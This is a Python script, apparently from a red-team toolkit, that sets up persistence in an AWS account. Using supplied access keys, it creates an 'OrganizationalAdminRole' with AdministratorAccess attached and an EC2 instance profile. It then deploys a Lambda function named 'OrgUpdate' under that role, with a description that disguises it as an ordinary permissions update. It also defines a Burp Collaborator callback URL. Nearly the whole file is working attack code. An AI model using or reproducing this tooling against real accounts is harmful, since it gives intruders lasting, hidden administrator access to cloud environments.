# AWS TTP Persistence / Persistence using EC2 and role.
# CreateUser DeleteUser CreateAccessKey DeleteAccessKey
# Hashicorp Red
import boto3
import time
import json

region = "us-west-2"
payload_url = 'http://nlcuto0tw09pnlu573pvaabek5qvek.burpcollaborator.net'

def listActions():
    print('CreatePolicy ✓')
    print('CreateRole ✓')
    print('RunInstances ✓')
    print('RunCommand ✓')

def create_role(ak,sk):
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    client = session.client('iam')
    with open('modules/policies/trust-lambda.json') as json_file:
        trust_json = json.load(json_file)
    client.create_role(
        RoleName='OrganizationalAdminRole',
        AssumeRolePolicyDocument=json.dumps(trust_json)
    )
    time.sleep(2)
    client.attach_role_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        RoleName='OrganizationalAdminRole'
    )
    client.create_instance_profile(
        InstanceProfileName='OrganizationalAdminRole'
    )
    client.add_role_to_instance_profile (
        InstanceProfileName = 'OrganizationalAdminRole',
        RoleName            = 'OrganizationalAdminRole' 
    )
    return True

def lambda_persist(ak,sk):
    create_role(ak,sk)
    time.sleep(15)
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    client = session.client('lambda')
    response = client.create_function(
        FunctionName='OrgUpdate',
        Runtime='python3.7',
        Role='arn:aws:iam::240213749104:role/OrganizationalAdminRole',
        Handler='lambda_function.lambda_handler',
        Code={
            'ZipFile': open('modules/resources/lambda.zip', 'rb').read()
        },
        Description='Updates org permissions',
        Publish=True,
        Tags={
        'Runner': '1'
        }
    )
    print(response)